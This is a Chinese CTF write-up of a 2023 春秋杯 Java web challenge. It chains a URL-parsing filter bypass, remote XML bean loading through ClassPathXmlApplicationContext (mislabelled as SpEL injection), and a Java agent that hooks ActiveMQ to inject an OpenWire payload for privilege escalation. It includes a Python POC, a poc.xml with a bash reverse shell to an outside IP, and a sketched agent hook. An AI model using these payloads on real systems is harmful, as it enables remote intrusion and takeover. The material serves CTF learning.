---
title: 利用 JavaAgent 插桩技术扩大攻击面以及反制攻击者
contest: 春秋杯
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [Java-Agent, instrumentation, ActiveMQ, OpenWire, ClassPathXmlApplicationContext, SPEL, URL-parse-bypass, broker-injection, SocketHook, agentmain]
attack_chain:
  - Step 1: 绕 Filter - URL 解析 /api;a=b/changefood 保留 /api 字符但 endpoint 变成 "achangefood" 不等于 "changefood"
  - Step 2: SPEL 注入 - foodServiceClassName=ClassPathXmlApplicationContext + name=http://vps/poc.xml 触发远程 XML RCE
  - Step 3: 通过 broker (player 用户) 攻击 merchant (root 用户) - Java agent 插桩 TcpTransport.oneway
  - Step 4: 构造 OpenWire command 31 协议: "1f01360000000000000100" + int2hex(className.length(),4) + string2hex(className) + int2hex(arg.length(),4) + string2hex(arg)
  - Step 5: 通过 broker 转发的 command 31 让 merchant 反序列化触发 ClassPathXmlApplicationContext RCE
  - Java agent SocketHook.agentmain 钩子 TcpTransport.oneway, 替换 wireFormat.marshal 后的 dataOut 内容
  - 提权: merchant root 启动 → 反弹 shell 读 /flag
key_payload: '/api;a=b/changefood + ClassPathXmlApplicationContext + Java agent hook TcpTransport.oneway + OpenWire command 31'
one_liner: 春秋杯 Java Agent 攻击：URL 解析绕 Filter + SPEL 注入 + Java agent 插桩 ActiveMQ broker 攻击 merchant 提权。
lesson: Java agent 插桩是横向移动的高阶武器；URL 解析差异（; 截断）可绕黑名单 filter；OpenWire 协议 command 31 是反序列化触发点。
quality: high
---

# 利用 JavaAgent 插桩技术扩大攻击面以及反制攻击者

**来源**: ctfiot.com ID 159151

## 攻击链

### Step 1: 绕 CustomerFilter
```java
// com.example.customer.filter.CustomerFilter#doFilter
String uri = ((HttpServletRequest)request).getRequestURI().replaceAll("/api", "");
String endpoint = uri.replaceAll("/", "");
if (endpoint.equalsIgnoreCase("changefood")) {
    response.getWriter().write("Under construction...");
} else {
    chain.doFilter(request, response);
}
```

**绕 URL**：
```
http://192.168.195.128:32821/api;a=b/changefood
```
- `replaceAll("/api", "")` 移除 "/api"
- `replaceAll("/", "")` 移除所有 "/"
- `endpoint = "achangefood"` 不等于 "changefood" → 放行
- 实际访问路径: `/api;a=b/changefood` 仍路由到 changefood 接口

### Step 2: SPEL 注入 RCE
```java
// com.example.customer.controller.OrderController#change
public String change(@RequestParam String foodServiceClassName, @RequestParam String name) {
    Class foodServiceClass;
    try {
        foodServiceClass = Class.forName(foodServiceClassName);
    } catch (ClassNotFoundException e) {
        foodServiceClass = Class.forName("com.example.customer.service.IronBeefNoodleService");
    }
    this.foodService = (FoodService) foodServiceClass.getDeclaredConstructor(String.class).newInstance(name);
    return "Changed to " + foodServiceClassName + " with name " + name;
}
```

**POC**：
```python
import requests
url = "http://192.168.195.128:32821/"
def change():
    u = url + "api;a=b/changefood"
    r = requests.post(u, {
        "foodServiceClassName": "org.springframework.context.support.ClassPathXmlApplicationContext",
        "name": "http://8.134.146.39:8000/poc.xml"
    }).text
    print(r)
change()
```

**poc.xml**：
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans>
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value><![CDATA[bash -i >& /dev/tcp/8.134.146.39/6666  0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

### Step 3: 提权 (player → root)
- `/flag` 没有 player 权限
- merchant 进程是 root 启动
- 通过 broker 攻击 merchant

### Step 4: Java Agent 插桩 broker
```java
// merchant.jar ActiveMQConnectionFactory 监听 Orders 队列
public static void main(String[] args) throws JMSException {
    ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(args[0]);
    connectionFactory.setTrustedPackages(List.of("com.example.customer.entity"));
    Connection connection = connectionFactory.createConnection();
    Session session = connection.createSession(false, 1);
    Destination destination = session.createQueue("Orders");
    MessageConsumer consumer = session.createConsumer(destination);
    consumer.setMessageListener((message) -> {
        if (message instanceof TextMessage) {
            TextMessage textMessage = (TextMessage) message;
            XStream xstream = new XStream(new StaxDriver());
            xstream.allowTypesByWildcard(new String[]{"com.example.customer.entity.*"});
            OrderEntity entity = (OrderEntity) xstream.fromXML(textMessage.getText());
            take(entity, args[1]);
        }
    });
}
```

### Step 5: OpenWire command 31 payload
```java
// Java agent SocketHook.agentmain
public class SocketHook {
    public static void agentmain(String agentArg, Instrumentation inst) throws Exception {
        String hookClass = "org.apache.activemq.transport.tcp.TcpTransport";
        String hookMethod = "oneway";
        String targetClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String arg = "http://8.134.146.39:8000/poc1.xml";
        String data = "1f01360000000000000100" + 
                      int2hex(targetClass.length(), 4) + string2hex(targetClass) + 
                      int2hex(arg.length(), 4) + string2hex(arg);
        // hook TcpTransport.oneway, 替换 dataOut 内容
    }
}
```

## 攻击思路
1. **替代方案 1**：杀掉 broker，61616 起恶意服务发送数据（会断连）
2. **替代方案 2（采用）**：Java agent 插桩 broker oneway 方法，替换 OpenWire command 31 payload

## 关键技术
- **URL 解析差异**：`/api;a=b/...` 中 `;a=b` 是 URL 参数，Tomcat 路径解析保留
- **SPEL 注入**：`Class.forName(...).getDeclaredConstructor(...).newInstance(...)`
- **ClassPathXmlApplicationContext RCE**：远程 XML Bean 工厂
- **Java Agent 插桩**：`Instrumentation` + `retransformClasses` + `addTransformer` 钩子方法
- **OpenWire command 31**：ActiveMQ 异常消息携带反序列化 payload
- **横向移动**：broker 进程被攻陷后，作为跳板攻击同一网络内的 root 进程

## 评价
春秋杯高阶 Java 安全题。考察：
- Spring 框架 SPEL 注入与 ClassPathXmlApplicationContext 远程 XML
- ActiveMQ OpenWire 协议利用
- Java agent 插桩技术作为高级攻击武器
- 进程权限边界与提权

是 Java 渗透测试的综合实战。
